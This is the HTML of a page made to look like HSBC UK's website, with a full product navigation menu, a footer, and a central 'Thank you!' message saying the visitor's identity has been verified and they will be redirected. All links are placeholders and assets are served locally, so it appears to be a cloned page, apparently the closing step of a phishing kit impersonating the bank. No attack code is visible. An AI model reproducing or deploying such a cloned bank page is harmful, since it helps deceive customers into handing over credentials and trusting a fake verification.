                                                <li role="none"><a role="menuitem" href="#" title="Student Visa Credit Card"  onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/HSBCStudentCard/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:HSBCStudentCard:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Student Visa Credit Card</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all credit cards"  onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/CreditCards/ViewAll/Tab','WT.ti','Homepage:Doormat:Borrowing:CreditCards:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">credit cards</span></a></p>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="Mortgages"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Mortgages/Tab','WT.ti','Doormat:Homepage:Borrowing:Mortgages:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgages</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">First time buyer</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Buy to let"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/BuyToLet/Tab','WT.ti','Doormat:Borrowing:BuyToLet:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buy to let</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Compare mortgages"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/FindAndCompare/Tab','WT.ti','Doormat:Borrowing:FindAndCompare:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Compare mortgages</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="How much can I borrow?"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/HowMuchCanIBorrow/Tab','WT.ti','Doormat:Borrowing:HowMuchCanIBorrow:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">How much can I borrow?</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Existing customers"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/ExistingMortgageCustomers/Tab','WT.ti','Doormat:Borrowing:ExistingMortgageCustomers:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Existing customers</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Overpayment calculator"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/OverpaymentCalculator/Tab','WT.ti','Doormat:Borrowing:OverpaymentCalculator:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overpayment calculator</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Repayment calculator"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/RepaymentCalculator/Tab','WT.ti','Doormat:Borrowing:RepaymentCalculator:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Repayment calculator</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Help &amp; guidance"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/MortgageHelpGuidance/Tab','WT.ti','Doormat:Borrowing:MortgageHelpGuidance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Help &#38; guidance</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all mortgages"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/Mortgages/ViewAll/Tab','WT.ti','Doormat:Borrowing:Mortgages:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">mortgages</span></a></p>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="Overdraft service"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Overdrafts/Tab','WT.ti','Doormat:Homepage:Borrowing:Overdrafts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overdraft service</a></h3>
                                            <p>Manage your money by agreeing a formal overdraft facility and keeping within its limit.</p>
                                            <p class="ctaLink"><a href="#" title="Learn more about overdrafts"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgagesRates/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgagesRates:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn more<span class="hidden"> about overdrafts</span></a></p>
                                            <h3><a href="#" title="Customer support"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer support</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Taking control of your finances"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/TakingControlOfYourFinances/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:TakingControlOfYourFinances:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Taking control of your finances</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Managing your mortgage payments"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/ManagingMortgagePayments/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:ManagingMortgagePayments:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Managing your mortgage payments</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Buying your first home"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageFTBGuide/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageFTBGuide:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buying your first home</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Mortgage jargon buster" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageJargonBuster/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageJargonBuster:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgage jargon buster</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all customer support"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">customer support</span></a></p>
                                        </div>
                                        <div class="column"><a href="#" title="Looking for a loan? Find out more."  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/LookingForALoan/Tab?WT.ac=HBEU_Doormat_Homepage_Borrowing_LookingForALoan','WT.ti','Doormat:Borrowing:LookingForALoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WTsi_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Looking for a loan? Find out more." height="155" src="assets/ContentService/gsp/saas/Components/default/doc/163x155_loan_tuktuk_d182694b.jpg?SAGG=gsp_uk" width="163" /></a></div>
                                    </div>
                                </div>
                        </li>
                        <li class="level1"><a tabindex="0" aria-expanded="false" aria-haspopup="true" class="mainTopNav"><strong>Investing</strong><br />
                                Products &#38; analysis</a>
                            <div class="doormatWrapper fourColRight">
                                <div class="arrow">&#160;</div>
                                <div class="doormat">
                                    <p class="skipLink"><a href="#" title="Move to Insurance navigation">Move to Insurance navigation</a></p>
                                    <div class="doormatLeft">
                                        <div class="column">
                                            <h3><a href="#" title="Investments"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investments</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Investment funds"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Funds/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Funds:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investment funds</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Selected Investment Funds ISA"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Investing/Investments/FundsISA/Tab','WT.ti','Doormat:Investing:Investments:FundsISA:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Selected Investment Funds ISA</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Sharedealing"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Sharedealing/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Sharedealing:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Sharedealing</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Premier Financial Advice"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/PremierAdvice/Tab','WT.ti','Doormat:Homepage:Investing:Investments:PremierAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Premier Financial Advice</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Child Trust Fund"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/ChildTrustFund/Tab','WT.ti','Doormat:Homepage:Investing:Investments:ChildTrustFund:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Child Trust Fund</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all investments"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Products/ViewAll/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Product:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">investments</span></a></p>
                                            <h3><a href="#" title="Global Investment Centre"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Global Investment Centre</a></h3>
                                            <p>Trade funds online</p>
                                            <p class="ctaLink"><a href="#" title="Find out more about trading funds online"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find out more <span class="hidden">about trading funds online</span></a></p>
                                            <h3><a href="#" title="Financial news and analysis."  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Investing_PromoSlot1','WT.ti','Doormat:Homepage:Investing:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial news and analysis.</a></h3>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="Why invest with us?"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/WhyInvestWithUs/Tab','WT.ti','Doormat:Homepage:Investing:WhyInvestWithUs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Why invest with us?</a></h3>
                                        </div>
                                        <div class="column"><a href="#" title="HSBC Products. The value of investments (and any income received from them) can fall as well as rise and you may not get back what you invested. Find out more."  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Investing/ISA/PromoSlot/Tab','WT.ti','Doormat:Investing:ISA:PromoSlot:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="HSBC Products. The value of investments (and any income received from them) can fall as well as rise and you may not get back what you invested. Find out more." height="310" src="assets/ContentService/gsp/saas/Components/default/doc/isa_326x310_d302_v03694b.jpg?SAGG=gsp_uk" width="326" /></a></div>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <li class="level1"><a tabindex="0" aria-expanded="false" aria-haspopup="true" class="mainTopNav"><strong>Insurance</strong><br />
                                Property &#38; family</a>
                            <div class="doormatWrapper fourColRight">
                                <div class="arrow">&#160;</div>
                                <div class="doormat">
                                    <p class="skipLink"><a href="#" title="Move to site search">Move Planning navigation</a></p>
                                    <div class="doormatLeft">
                                        <div class="column">
                                            <h3><a href="#" title="Travel Insurance"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HeaderLink/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:HeaderLink:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Travel Insurance"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel Insurance</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="HSBC Premier Travel Insurance"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC Premier Travel Insurance</a></li>
                                                <h3><a href="#" title="Home Insurance"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot1','WT.ti','Doormat:Insurance:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home Insurance</a></h3>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="View all HSBC Insurance options"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/AllInsuranceProducts/Tab','WT.ti','Doormat:Homepage:Insurance:AllInsuranceProducts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all HSBC Insurance options</a></h3>
                                            <h3><a href="#" title="Customer support"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer support</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Home Insurance claims"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HomeInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:HomeInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home Insurance claims</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Travel Insurance claims"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel Insurance claims</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Premier Travel Insurance claims"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier Travel Insurance claims</a></li>
                                            </ul>
                                            <p class="ctaLink"><a href="#" title="View all customer support"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View all <span class="hidden">customer support</span></a></p>
                                        </div>
                                        <div class="column"><a href="#" title="Protect the things that matter. Learn more."  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot2/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot3','WT.ti','Doormat:Insurance:PromoSlot3:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Protect the things that matter. From your house and car to your next holiday, we offer a range of policies to protect what's important. Learn more." height="155" src="assets/ContentService/gsp/saas/Components/default/doc/326_155_insurance_protect_d182694b.jpg?SAGG=gsp_uk" width="326" /></a></div>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <li class="level1"><a tabindex="0" aria-expanded="false" aria-haspopup="true" class="mainTopNav"><strong>Life events</strong><br />
                                Help and support</a>
                            <div class="doormatWrapper fourColRight">
                                <div class="arrow">&#160;</div>
                                <div class="doormat">
                                    <p class="skipLink"><a href="#" title="Move to site search">Move to site search</a></p>
                                    <div class="doormatLeft">
                                        <div class="column">
                                            <h3><a href="#" title="Life events"  class="extLink" onclick="">Life events</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Bereavement support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/BereavementSupport/Tab','WT.ti','Doormat:Homepage:Planning:BereavementSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bereavement support</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Separation support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SeparationSupport/Tab','WT.ti','Doormat:Homepage:Planning:SeparationSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Separation support</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Settling in the UK"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SettlingInTheUK/Tab','WT.ti','Doormat:Homepage:Planning:SettlingInTheUK:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Settling in the UK</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Getting married"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GettingMarried/Tab','WT.ti','Doormat:Homepage:Planning:GettingMarried:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Getting married</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Planning your retirement"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningYourRetirement/Tab','WT.ti','Doormat:Homepage:Planning:PlanningYourRetirement:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning your retirement</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Growing your wealth"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GrowingYourWealth/Tab','WT.ti','Doormat:Homepage:Planning:GrowingYourWealth:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Growing your wealth</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Moving abroad"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/MovingAbroad/Tab','WT.ti','Doormat:Homepage:Planning:MovingAbroad:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Moving abroad</a></li>
                                            </ul>
                                            <h3><a href="#" title="Planning tools"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningTools/Tab','WT.ti','Doormat:Homepage:Planning:PlanningTools:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning tools</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Financial health check"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/FinancialHealthCheck/Tab','WT.ti','Doormat:Homepage:Planning:FinancialHealthCheck:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial health check</a></li>
                                            </ul>
                                        </div>
                                        <div class="column">
                                            <h3><a href="#" title="Protecting what matters"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Protecting what matters</a></h3>
                                            <p class="ctaLink"><a href="#" title="Protecting what matters. Learn more."  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn more</a></p>
                                            <h3><a href="#" title="Customer support"  onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer support</a></h3>
                                            <ul role="menu">
                                                <li role="none"><a role="menuitem" href="#" title="Ways we can help"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/NeedAdvice/Tab','WT.ti','Doormat:Homepage:Planning:CustomerSupport:NeedAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways we can help</a></li>
                                                <li role="none"><a role="menuitem" href="#" title="Frequently asked questions"  class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/FAQs/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:FAQs/Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Frequently asked questions</a></li>
                                            </ul>
                                        </div>
                                        <div class="column"><a href="#" title="Heading off on a new adventure?"  onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot2/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot2','WT.ti','Doormat:Planning:PromoSlot2:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Heading off on a new adventure? We know there's a lot for you to think about when moving abroad, which is why we can help you transfer your finances as well as provide information on what to do before and after you leave the UK. Learn more." height="310" src="assets/ContentService/gsp/saas/Components/default/doc/326x310_moving_abroad_d182694b.jpg?SAGG=gsp_uk" width="326" /></a></div>
                                    </div>
                                </div>
                            </div>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>
    <!-- Header Section Ends -->
    <!-- Entity Content Top Starts -->
    <p><!-- Page Title Starts --></p>
    <div class="pageHeaderBg">
        <div class="pageHeading row">
            <div class="pageHeadingInner">
                <h2>Thank you!</h2>
            </div>
        </div>
    </div>
    <p><!-- Page Title Ends --></p>
    <!-- Entity Content Top Ends -->
    <div class="innerPage" id="innerPage">
        <div class="grid_skin">
            <div style="text-align: center;">
                <img src="assets/spin.gif" /> <br /><br />
                <p style="text-align: center;">Your identity has been verified successfully, you will now be redirected to the main page.</p>

            </div>

            <!-- File missing from nas for gsp_eu_uat although its there in WCM. Adding this comment so that we can syndicate the file again. 27-MAY-14 -->
        </div>
    </div>
    <div class="innerPage">
        <div class="grid_skin">
            <div class="row">
            </div>
        </div>
    </div>
    <!-- Entity Content Bottom Ends -->
    <!-- Footer Section Starts -->
    <!-- webtrends start  -->
    <script type="text/javascript" src="assets/gsp/saas/Components/default/resources/script/theme_public/js/bottom_section.js"></script>
    <!--Webtrends ends-->
    <script type="text/javascript"> (function(a,b,c,d){ a='assets/../tags.tiqcdn.com/utag/hsbc/utag.js'; b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true; a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a); })(); </script>
    <style type="text/css">
        #footerMapRow ,#footerLinksRow, #footerUtilityRow {width: 940px;}
        #footerMap #footerMapRow .column.last {padding-right: 0}
        #footerMap #footerMapRow .column {padding: 0 10px 0 0;width:145px;}</style>
    <div dir="ltr" id="footerLinks">
        <div id="footerLinksRow">
            <ul style="display: flex; white-space: nowrap;">
                <li class="contact">
                    <a href="#" title="Help &amp; Support" >Help &amp; Support</a></li>
                <li class="branch">
                    <a href="#" title="Find a branch" >Find a branch</a></li>
                <!-- <li class="feedback">
                   <a href="#" title="Website feedback. Rate your experience on this page. This link will open an overlay window.">Website feedback</a></li> -->
            </ul>
        </div>
    </div>
    <div dir="ltr" id="footerMap">
        <div class="sixCol" id="footerMapRow">
            <div class="column last">
                <h2>
                    <a href="#" title="Support" >Support</a></h2>
                <ul>
                    <li>
                        <a href="#" title="Security centre" >Security centre</a></li>
                    <li>
                        <a href="#" title="Card support" >Card support</a></li>
                    <li>
                        <a onClick="window.tealiumLaunchCobrowse(); return false;" href="#" title="CoBrowse">CoBrowse</a></li>
                </ul>
            </div>
        </div>
    </div>
    <div dir="ltr" id="footerUtility">
        <div id="footerUtilityRow">
            <ul>
                <li>
                    <a href="#" title="About HSBC" >About HSBC</a></li>
                <li>
                    <a href="#" title="Site map" >Site map</a></li>
                <li>
                    <a href="#" title="Legal" >Legal</a></li>
                <li>
                    <a href="#" title="Privacy Notice">Privacy notice</a></li>
                <li>
                    <a href="#" title="Cookie Policy"  class="dnt_no_consent">Cookie Policy</a></li>
                <li>
                    <a href="#" title="Accessibility" >Accessibility</a></li>
                <li>
                    <a href="#" title="HSBC Group. This link will open in a new browser window" target="_blank"  onclick="window.open('http://www.hsbc.co.uk/1/2/popups/hsbc-interstitial', '_blank', 'status=yes,location=no,menubar=no,resizable=yes,scrollbars=yes,toolbar=no,width=635,height=545,screenX=0,left=0,screenY=0,top=0'); return false;">HSBC Group</a></li>
            </ul>
            <p>
                &copy; &nbsp;HSBC Group 2018</p>
